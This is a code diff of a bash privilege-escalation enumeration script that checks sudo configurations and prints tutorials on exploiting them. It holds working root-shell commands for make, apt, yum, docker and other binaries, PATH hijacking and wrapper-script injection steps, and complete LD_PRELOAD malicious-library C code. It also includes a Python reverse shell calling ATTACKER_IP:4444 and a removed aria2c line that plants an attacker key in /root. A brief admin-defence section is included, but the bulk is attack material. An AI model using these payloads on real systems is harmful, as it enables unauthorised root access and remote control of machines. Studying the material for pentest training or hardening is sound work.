-                    critical "NOPASSWD chown - Take ownership: sudo chown $(whoami) /etc/shadow"
-                    teach "  → sudo chown $(whoami) /etc/shadow"
-                    teach "  → Then edit file"
-                    ;;
+                    
                 make)
-                    critical "NOPASSWD make - Execute Makefile commands: sudo make -s --eval=$'x:\\n\\t-/bin/sh'"
-                    teach "  → sudo make -s --eval=$'x:\\n\\t-/bin/sh'"
+                    teach "╔════════════════════════════════════════════════════════════════╗"
+                    teach "║  MAKE EXPLOITATION - MAKEFILE EXECUTION"
+                    teach "╚════════════════════════════════════════════════════════════════╝"
+                    teach ""
+                    teach "EXPLOITATION:"
+                    teach "  sudo $bin -s --eval=\$'x:\\n\\t-/bin/bash -p'"
+                    teach ""
+                    teach "ALTERNATE - If you can write Makefile:"
+                    teach "  echo 'x:' > /tmp/Makefile"
+                    teach "  echo -e '\\t/bin/bash -p' >> /tmp/Makefile"
+                    teach "  cd /tmp && sudo $bin"
                     ;;
-                gcc)
-                    teach "  → sudo gcc -wrapper /bin/sh,-s ."
+                    
+                apt|apt-get)
+                    teach "╔════════════════════════════════════════════════════════════════╗"
+                    teach "║  APT/APT-GET EXPLOITATION - PRE-INVOKE HOOKS"
+                    teach "╚════════════════════════════════════════════════════════════════╝"
+                    teach ""
+                    teach "WHY APT IS DANGEROUS:"
+                    teach "  APT can run commands before/after package operations"
+                    teach "  These hooks (Pre-Invoke) execute as root"
+                    teach ""
+                    teach "EXPLOITATION:"
+                    teach "  sudo $bin update -o APT::Update::Pre-Invoke::=/bin/sh"
+                    teach ""
+                    teach "ALTERNATE - Config file method:"
+                    teach "  echo 'APT::Update::Pre-Invoke {\"/bin/bash -i\"};' > /tmp/pwn"
+                    teach "  sudo $bin update -c /tmp/pwn"
                     ;;
-                knife)
-                    critical "NOPASSWD knife (Chef) - Execute shell: sudo knife exec -E 'exec \"/bin/sh\"'"
-                    teach "  → sudo knife exec -E 'exec \"/bin/sh\"'"
+                    
+                yum)
+                    teach "╔════════════════════════════════════════════════════════════════╗"
+                    teach "║  YUM EXPLOITATION - PLUGIN LOADING"
+                    teach "╚════════════════════════════════════════════════════════════════╝"
+                    teach ""
+                    teach "EXPLOITATION:"
+                    teach "  TF=\$(mktemp -d)"
+                    teach "  cat > \$TF/x.py << 'EOF'"
+                    teach "  import os"
+                    teach "  import yum"
+                    teach "  from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE"
+                    teach "  requires_api_version='2.1'"
+                    teach "  def init_hook(conduit):"
+                    teach "      os.execl('/bin/bash','bash')"
+                    teach "  EOF"
+                    teach "  sudo $bin -c \"pluginpath=\$TF\" --plugins list"
                     ;;
-                neofetch)
-                    critical "NOPASSWD neofetch with env_keep - Config file exploitation"
-                    teach "  → echo 'exec /bin/sh' > /tmp/config.conf"
-                    teach "  → export XDG_CONFIG_HOME=/tmp"
-                    teach "  → sudo neofetch"
+                    
+                docker)
+                    teach "╔════════════════════════════════════════════════════════════════╗"
+                    teach "║  DOCKER EXPLOITATION - CONTAINER MOUNT"
+                    teach "╚════════════════════════════════════════════════════════════════╝"
+                    teach ""
+                    teach "WHY DOCKER SUDO IS CRITICAL:"
+                    teach "  Docker daemon runs as root"
+                    teach "  Can mount host filesystem inside containers"
+                    teach "  Container root = host root (by default)"
+                    teach ""
+                    teach "EXPLOITATION:"
+                    teach "  sudo $bin run -v /:/mnt --rm -it alpine chroot /mnt /bin/bash"
+                    teach ""
+                    teach "WHAT'S HAPPENING:"
+                    teach "  -v /:/mnt        # Mount host root to /mnt in container"
+                    teach "  --rm             # Remove container after exit"
+                    teach "  -it              # Interactive terminal"
+                    teach "  alpine           # Lightweight image"
+                    teach "  chroot /mnt      # Change root to mounted host filesystem"
+                    teach "  /bin/bash        # Spawn shell"
+                    teach ""
+                    teach "RESULT:"
+                    teach "  You're now root on the HOST system, not in a container"
                     ;;
-                jjs)
-                    critical "NOPASSWD jjs (Java JavaScript) - Execute commands via Nashorn"
-                    teach "  → echo 'Java.type(\"java.lang.Runtime\").getRuntime().exec(\"/bin/sh\").waitFor()' | sudo jjs"
-                    ;;
-                luvit)
-                    critical "NOPASSWD luvit (Lua) - Execute Lua code as root"
-                    teach "  → sudo luvit -e 'os.execute(\"/bin/sh\")'"
-                    ;;
-                aria2c)
-                    teach "  → sudo aria2c -d /root -o authorized_keys 'http://attacker/key'"
-                    ;;
-                busybox)
-                    critical "NOPASSWD busybox - Execute any busybox applet: sudo busybox sh"
-                    teach "  → sudo busybox sh"
-                    ;;
-                rpm)
-                    teach "  → Create malicious RPM with postinstall script"
-                    teach "  → sudo rpm -i malicious.rpm"
-                    ;;
+                    
                 *)
-                    teach "  → Check GTFOBins for: $bin"
+                    warn "Binary: $basename"
+                    teach "→ Not in our database. Check GTFOBins:"
+                    teach "  https://gtfobins.github.io/#$basename"
+                    teach ""
+                    teach "GENERAL EXPLOITATION APPROACH:"
+                    teach "  1. Does it spawn a shell? (bash, sh, exec)"
+                    teach "  2. Can it execute commands? (system(), exec(), etc.)"
+                    teach "  3. Does it have a pager? (!, :!sh)"
+                    teach "  4. Can it write files? (may allow /etc/sudoers modification)"
+                    teach "  5. Does it call other programs? (PATH hijacking potential)"
                     ;;
             esac
+            log ""
         done
     fi
     
-    # Check for environment variable preservation
-    if echo "$sudo_output" | grep -q "env_keep"; then
-        vuln "Sudo preserves environment variables"
-        teach "env_keep allows you to preserve environment variables when using sudo"
-        teach "  This can be exploited with LD_PRELOAD or LD_LIBRARY_PATH"
-        teach "  Create malicious library, set LD_PRELOAD, run sudo command"
+    # Finding 3: Wildcard injection opportunities
+    if [ $found_wildcards -eq 1 ]; then
+        critical "WILDCARD IN SUDO COMMANDS - Argument injection possible"
+        log ""
+        teach "╔════════════════════════════════════════════════════════════════╗"
+        teach "║  WILDCARD INJECTION - ADVANCED EXPLOITATION"
+        teach "╚════════════════════════════════════════════════════════════════╝"
+        teach ""
+        teach "WHAT WILDCARDS MEAN:"
+        teach "  Admins sometimes use wildcards in sudoers to allow flexibility:"
+        teach "  Example: alice ALL=(ALL) NOPASSWD: /usr/bin/systemctl * apache2"
+        teach ""
+        teach "THE VULNERABILITY:"
+        teach "  Wildcards match ANY text, including additional arguments"
+        teach "  You can inject malicious arguments that change command behavior"
+        teach ""
+        teach "EXAMPLE SCENARIO:"
+        teach "  Sudoers entry:"
+        teach "  bob ALL=(ALL) NOPASSWD: /usr/bin/systemctl * apache2"
+        teach ""
+        teach "  Admin intention:"
+        teach "    sudo systemctl restart apache2"
+        teach "    sudo systemctl stop apache2"
+        teach ""
+        teach "  Exploitation:"
+        teach "    sudo systemctl status apache2"
+        teach "    # Wait for pager, then: !sh"
+        teach ""
+        teach "WHY IT WORKS:"
+        teach "  'systemctl status apache2' matches the pattern"
+        teach "  'status' matches the wildcard"
+        teach "  systemctl shows output in pager → pager escape"
+        teach ""
+        
+        while IFS= read -r line; do
+            vuln "Wildcard entry: $line"
+            
+            # Analyze what can be done
+            if echo "$line" | grep -qi "systemctl"; then
+                teach "→ systemctl wildcard detected"
+                teach "  Try: sudo systemctl status <service> → !sh"
+            fi
+            
+            if echo "$line" | grep -qi "find"; then
+                teach "→ find wildcard detected"
+                teach "  Inject -exec: sudo find <matching_pattern> . -exec /bin/sh \\;"
+            fi
+            
+            if echo "$line" | grep -qi "vim\|vi\|nano\|emacs"; then
+                teach "→ Editor with wildcard"
+                teach "  Any file access → shell escape from editor"
+            fi
+        done < "$temp_wildcards"
+        log ""
+    fi
+    
+    # Finding 4: Relative paths (PATH hijacking)
+    if [ $found_relative_paths -eq 1 ]; then
+        critical "RELATIVE PATHS IN SUDO - PATH hijacking possible"
+        log ""
+        teach "╔════════════════════════════════════════════════════════════════╗"
+        teach "║  PATH HIJACKING - SUDO EDITION"
+        teach "╚════════════════════════════════════════════════════════════════╝"
+        teach ""
+        teach "WHAT RELATIVE PATHS MEAN:"
+        teach "  Absolute path: /usr/bin/python (starts with /)"
+        teach "  Relative path: python (no leading /)"
+        teach ""
+        teach "THE VULNERABILITY:"
+        teach "  When sudo runs a relative path command, it searches \$PATH"
+        teach "  If you control a directory early in PATH, you control what executes"
+        teach ""
+        teach "WHY THIS HAPPENS:"
+        teach "  Admin writes in sudoers: alice ALL=(ALL) NOPASSWD: python /scripts/backup.py"
+        teach "  Thinks: 'python will be /usr/bin/python'"
+        teach "  Reality: 'python' searches PATH directories in order"
+        teach ""
+        teach "EXPLOITATION STEPS:"
+        teach ""
+        teach "  1. Check current PATH:"
+        teach "     echo \$PATH"
+        teach ""
+        teach "  2. Find writable directory in PATH:"
+        teach "     # Often /usr/local/bin or /tmp if misconfigured"
+        teach ""
+        teach "  3. Create malicious binary in that directory:"
+        
+        while IFS='|' read -r line cmd; do
+            [ -z "$cmd" ] && continue
+            vuln "Relative path: $cmd"
+            teach ""
+            teach "  Create fake $cmd:"
+            teach "  cat > /tmp/$cmd << 'EOF'"
+            teach "  #!/bin/bash"
+            teach "  /bin/bash -p"
+            teach "  EOF"
+            teach "  chmod +x /tmp/$cmd"
+            teach ""
+            teach "  4. Modify PATH (if possible):"
+            teach "     export PATH=/tmp:\$PATH"
+            teach ""
+            teach "  5. Run sudo command:"
+            teach "     sudo $cmd ..."
+            teach "     # Executes YOUR binary as root"
+        done < "$temp_relative"
+        log ""
+    fi
+    
+    # Finding 5: Shell wrapper scripts
+    if [ $found_shell_wrappers -eq 1 ]; then
+        warn "SHELL WRAPPER SCRIPTS IN SUDO - Analyze for command injection"
+        log ""
+        teach "╔════════════════════════════════════════════════════════════════╗"
+        teach "║  SHELL WRAPPER EXPLOITATION"
+        teach "╚════════════════════════════════════════════════════════════════╝"
+        teach ""
+        teach "WHAT ARE WRAPPER SCRIPTS:"
+        teach "  Shell scripts that wrap other commands"
+        teach "  Often added to sudoers instead of the actual binary"
+        teach ""
+        teach "COMMON VULNERABILITIES:"
+        teach "  1. Command injection via arguments"
+        teach "  2. Unquoted variables"
+        teach "  3. Unsafe use of user input"
+        teach "  4. Calls to other programs without full paths"
+        teach ""
+        
+        while IFS='|' read -r line script; do
+            [ -z "$script" ] && continue
+            vuln "Wrapper script: $script"
+            
+            if [ -r "$script" ]; then
+                teach ""
+                teach "Analyzing $script for vulnerabilities..."
+                
+                # Check for command injection patterns
+                if grep -E '\$[1-9@*]|\${.*}' "$script" | grep -v '^#' | grep -q .; then
+                    critical "  Script uses user input/arguments!"
+                    teach "  Found user input usage:"
+                    grep -E '\$[1-9@*]|\${.*}' "$script" | grep -v '^#' | head -3 | while read found; do
+                        teach "    $found"
+                    done
+                fi
+                
+                # Check for unquoted variables
+                if grep -E '\$[A-Za-z_][A-Za-z0-9_]*[^"]' "$script" | grep -v '^#' | grep -q .; then
+                    warn "  Potentially unquoted variables detected"
+                fi
+                
+                # Check for calls without absolute paths
+                if grep -vE '^#|^[[:space:]]*#' "$script" | grep -E '^[[:space:]]*(system|exec|eval|source|\.)' | grep -q .; then
+                    warn "  Script calls other programs - check for PATH exploitation"
+                fi
+                
+                teach ""
+                teach "EXPLOITATION APPROACHES:"
+                teach "  1. If script uses arguments unsafely:"
+                teach "     sudo $script '; /bin/bash #'"
+                teach "     sudo $script '\$(whoami)'"
+                teach ""
+                teach "  2. If script calls other binaries:"
+                teach "     - Check if PATH can be modified"
+                teach "     - Create malicious binary with same name"
+                teach ""
+                teach "  3. Manual analysis:"
+                teach "     cat $script"
+                teach "     Look for: eval, system(), exec, unquoted \$variables"
+            else
+                warn "  Cannot read script - manual analysis required"
+            fi
+        done < "$temp_wrappers"
+        log ""
+    fi
+    
+    # Finding 6: SETENV tag
+    if [ $has_setenv -eq 1 ]; then
+        critical "SETENV TAG DETECTED - Can modify environment variables"
+        log ""
+        teach "╔════════════════════════════════════════════════════════════════╗"
+        teach "║  SETENV - ENVIRONMENT VARIABLE CONTROL"
+        teach "╚════════════════════════════════════════════════════════════════╝"
+        teach ""
+        teach "WHAT SETENV DOES:"
+        teach "  Allows setting arbitrary environment variables when using sudo"
+        teach "  Normally sudo sanitizes environment for security"
+        teach "  SETENV disables this protection"
+        teach ""
+        teach "WHY IT'S DANGEROUS:"
+        teach "  Many programs rely on environment variables"
+        teach "  Attackers can hijack behavior by setting:"
+        teach "  • LD_PRELOAD (load malicious library)"
+        teach "  • LD_LIBRARY_PATH (override library location)"
+        teach "  • PATH (hijack command resolution)"
+        teach "  • PYTHONPATH (inject malicious Python modules)"
+        teach ""
+        teach "EXPLOITATION:"
+        teach "  sudo ARBITRARY_VAR=value <allowed_command>"
+        teach ""
+        teach "SPECIFIC ATTACKS:"
+        teach ""
+        teach "  1. LD_PRELOAD (if program uses dynamic libraries):"
+        teach "     Create evil.c:"
+        teach "     #include <stdio.h>"
+        teach "     #include <sys/types.h>"
+        teach "     #include <stdlib.h>"
+        teach "     void _init() {"
+        teach "         unsetenv(\"LD_PRELOAD\");"
+        teach "         setgid(0); setuid(0);"
+        teach "         system(\"/bin/bash -p\");"
+        teach "     }"
+        teach ""
+        teach "     Compile:"
+        teach "     gcc -shared -fPIC -o /tmp/evil.so evil.c"
+        teach ""
+        teach "     Execute:"
+        teach "     sudo LD_PRELOAD=/tmp/evil.so <allowed_command>"
+        teach ""
+        teach "  2. If Python script:"
+        teach "     mkdir /tmp/modules"
+        teach "     cat > /tmp/modules/os.py << 'EOF'"
+        teach "     import socket,subprocess"
+        teach "     s=socket.socket()"
+        teach "     s.connect((\"ATTACKER_IP\",4444))"
+        teach "     subprocess.call([\"/bin/bash\"],stdin=s.fileno(),"
+        teach "       stdout=s.fileno(),stderr=s.fileno())"
+        teach "     EOF"
+        teach ""
+        teach "     sudo PYTHONPATH=/tmp/modules <python_script>"
+        log ""
+    fi
+    
+    # Finding 7: env_keep with LD_PRELOAD
+    if [ $has_ld_preload -eq 1 ]; then
+        critical "LD_PRELOAD PRESERVED - Library injection attack"
+        log ""
+        teach "╔════════════════════════════════════════════════════════════════╗"
+        teach "║  LD_PRELOAD EXPLOITATION - IN DEPTH"
+        teach "╚════════════════════════════════════════════════════════════════╝"
+        teach ""
+        teach "WHAT IS LD_PRELOAD:"
+        teach "  Environment variable that forces dynamic linker to load"
+        teach "  specified libraries BEFORE all others"
+        teach ""
+        teach "HOW PROGRAMS LOAD LIBRARIES:"
+        teach "  1. Program starts"
+        teach "  2. Dynamic linker (ld.so) loads shared libraries"
+        teach "  3. If LD_PRELOAD is set, loads those libraries first"
+        teach "  4. Any functions in preloaded library override system libraries"
+        teach ""
+        teach "THE ATTACK:"
+        teach "  We create a malicious library with an _init() function"
+        teach "  _init() runs automatically when library loads"
+        teach "  Our code executes before main program even starts"
+        teach "  Since sudo runs as root, our code runs as root"
+        teach ""
+        teach "COMPLETE EXPLOITATION:"
+        teach ""
+        teach "  Step 1: Create malicious library (evil.c):"
+        teach "  cat > /tmp/evil.c << 'EOF'"
+        teach "  #include <stdio.h>"
+        teach "  #include <sys/types.h>"
+        teach "  #include <stdlib.h>"
+        teach ""
+        teach "  void _init() {"
+        teach "      // Unset LD_PRELOAD to avoid issues"
+        teach "      unsetenv(\"LD_PRELOAD\");"
+        teach "      "
+        teach "      // Set real and effective UID to 0 (root)"
+        teach "      setgid(0);"
+        teach "      setuid(0);"
+        teach "      "
+        teach "      // Spawn root shell"
+        teach "      system(\"/bin/bash -p\");"
+        teach "  }"
+        teach "  EOF"
+        teach ""
+        teach "  Step 2: Compile as shared library:"
+        teach "  gcc -shared -fPIC -o /tmp/evil.so /tmp/evil.c -nostartfiles"
+        teach ""
+        teach "  Flags explanation:"
+        teach "  -shared       : Create shared library (.so)"
+        teach "  -fPIC         : Position Independent Code (required for .so)"
+        teach "  -nostartfiles : Don't use standard startup files"
+        teach ""
+        teach "  Step 3: Execute with ANY sudo-allowed command:"
+        teach "  sudo LD_PRELOAD=/tmp/evil.so <any_allowed_command>"
+        teach ""
+        teach "  Example commands that work:"
+        teach "  sudo LD_PRELOAD=/tmp/evil.so find /etc -name passwd"
+        teach "  sudo LD_PRELOAD=/tmp/evil.so apache2ctl restart"
+        teach "  sudo LD_PRELOAD=/tmp/evil.so cat /etc/issue"
+        teach ""
+        teach "WHY THIS WORKS:"
+        teach "  The command doesn't matter - it never actually runs"
+        teach "  Our _init() executes during library loading"
+        teach "  We spawn bash and the original command never executes"
+        teach ""
+        teach "REQUIREMENTS:"
+        teach "  • gcc must be available (or compile elsewhere)"
+        teach "  • At least ONE sudo command allowed"
+        teach "  • That command must use shared libraries (most do)"
+        log ""
+    fi
+    
+    # Finding 8: env_keep with LD_LIBRARY_PATH
+    if [ $has_ld_library_path -eq 1 ]; then
+        warn "LD_LIBRARY_PATH PRESERVED - Library path hijacking"
+        log ""
+        teach "LD_LIBRARY_PATH allows specifying directories to search for libraries"
+        teach "Similar to LD_PRELOAD but requires matching library names"
+        teach ""
+        teach "EXPLOITATION:"
+        teach "  1. Find which libraries the sudo program uses:"
+        teach "     ldd <sudo_allowed_command>"
+        teach "  2. Create malicious version of one library"
+        teach "  3. Place in writable directory"
+        teach "  4. Run: sudo LD_LIBRARY_PATH=/your/dir <command>"
+        log ""
+    fi
+    
+    # === PHASE 4: GENERAL SUDO EDUCATION (ALWAYS SHOW) ===
+    log ""
+    teach "╔════════════════════════════════════════════════════════════════╗"
+    teach "║  SUDO SECURITY - KEY TAKEAWAYS"
+    teach "╚════════════════════════════════════════════════════════════════╝"
+    teach ""
+    teach "MENTAL MODEL FOR SUDO EXPLOITATION:"
+    teach ""
+    teach "  When you see a sudo entry, ask these questions:"
+    teach ""
+    teach "  1. WHAT can I run?"
+    teach "     → Specific binary or wildcard?"
+    teach ""
+    teach "  2. HOW is it specified?"
+    teach "     → Absolute path (/usr/bin/vim) or relative (vim)?"
+    teach ""
+    teach "  3. CAN it spawn a shell?"
+    teach "     → Editors, pagers, interpreters = YES"
+    teach ""
+    teach "  4. DOES it process my input?"
+    teach "     → Arguments, environment variables, files?"
+    teach ""
+    teach "  5. WHAT environment is preserved?"
+    teach "     → LD_PRELOAD, PATH, PYTHONPATH?"
+    teach ""
+    teach "EXPLOITATION PRIORITY:"
+    teach "  1. (ALL:ALL) NOPASSWD: ALL → sudo /bin/bash (instant)"
+    teach "  2. NOPASSWD with shell (bash, sh, zsh) → sudo bash (instant)"
+    teach "  3. NOPASSWD with editor (vim, nano) → shell escape"
+    teach "  4. NOPASSWD with interpreter (python, perl) → spawn shell"
+    teach "  5. LD_PRELOAD preserved → library injection"
+    teach "  6. Wildcards in commands → argument injection"
+    teach "  7. Relative paths → PATH hijacking"
+    teach "  8. Shell scripts → command injection"
+    teach ""
+    teach "COMMON GTFOBINS PATTERNS:"
+    teach "  • Editors: :!/bin/bash or :shell"
+    teach "  • Pagers: !sh or !bash"
+    teach "  • Interpreters: -c 'import os; os.system(\"/bin/bash\")'"
+    teach "  • Find utilities: -exec /bin/bash \\;"
+    teach "  • Package managers: Pre/Post-invoke hooks"
+    teach ""
+    teach "DEFENSE (from admin perspective):"
+    teach "  ✗ DON'T: alice ALL=(ALL) NOPASSWD: ALL"
+    teach "  ✗ DON'T: bob ALL=(ALL) /usr/bin/*"
+    teach "  ✗ DON'T: charlie ALL=(ALL) vim"
+    teach ""
+    teach "  ✓ DO: david ALL=(ALL) /usr/bin/systemctl restart apache2"
+    teach "  ✓ DO: Use argument restrictions (sudoedit instead of vim)"
+    teach "  ✓ DO: Require passwords (avoid NOPASSWD)"
+    teach "  ✓ DO: Use absolute paths only"
+    teach "  ✓ DO: Minimize sudo access"
+    teach ""
+    teach "REMEMBER:"
+    teach "  Every sudo entry is a potential privilege escalation"
+    teach "  Check GTFOBins for EVERY binary you have sudo access to"
+    teach "  Even 'harmless' utilities often have shell escapes"
+    teach "  Environmental control (LD_PRELOAD, SETENV) = game over"
+    log ""
+    
+    # === PHASE 5: DISPLAY FULL SUDO OUTPUT ===
+    if [ $has_sudo -eq 1 ]; then
+        info "Your complete sudo permissions:"
+        echo "$sudo_output" | while read line; do
+            log "  $line"
+        done
+        log ""
+        
+        if [ -n "$sudo_version" ]; then
+            info "Sudo version: $sudo_version"
+            teach "Check enum_sudo_version for version-specific CVEs"
+        fi
     fi
 }
 # === SUDO VERSION ANALYSIS ===
